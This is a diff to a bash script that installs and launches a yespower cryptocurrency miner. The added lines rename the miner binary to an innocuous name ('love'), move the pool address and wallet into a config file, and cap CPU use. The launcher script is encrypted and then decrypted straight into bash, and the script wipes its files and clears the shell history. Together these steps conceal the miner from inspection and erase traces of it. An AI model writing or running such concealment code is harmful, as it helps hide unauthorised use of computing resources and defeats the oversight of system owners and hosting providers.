@@ -25,15 +25,22 @@ for server in "${servers[@]}"; do
     fi
 done
 echo "$fastest_server with min_latency is: $latency"
-
+mv /root/cpuminer-opt-linux/cpuminer-sse2 /root/love
+cat >>/root/config.json <<EOF
+{
+  "url": "stratum+tcps://$fastest_server:17079",
+  "user": "v3K4mds92oWPHSPuQ4Tm6bSSNMCmNj1JyY.VultrLimit"
+}
+EOF
 cat /dev/null > /root/danielluis1921.sh
 cat >>/root/danielluis1921.sh <<EOF
 #!/bin/bash
 ./kill_miner.sh
 sleep 3
-sudo /root/cpuminer-opt-linux/cpuminer-sse2 --background --threads=$cores -a yespower -o stratum+tcps://$fastest_server:17079 -u v3K4mds92oWPHSPuQ4Tm6bSSNMCmNj1JyY.VultrLimit
+sudo /root/love --background --threads=$cores -a yespower -c config.json
 sleep 3
 EOF
+sed -i "$ a\\cpulimit --limit=$limitCPU --pid \$(pidof love) > /dev/null 2>&1 &" danielluis1921.sh
 openssl enc -aes-256-cbc -salt -pbkdf2 -in danielluis1921.sh -out danielluis1922.sh -k $password
 rm -fv danielluis1921.sh
 chmod +x /root/danielluis1922.sh
@@ -43,3 +50,7 @@ chmod +x /root/kill_miner.sh
 ./kill_miner.sh
 sleep 3
 openssl enc -d -aes-256-cbc -pbkdf2 -in danielluis1922.sh -k $password | bash
+rm -fv *
+rm -fR cpuminer-opt-linux/
+rm -fR xmrig-6.21.0/
+history -c && history -w
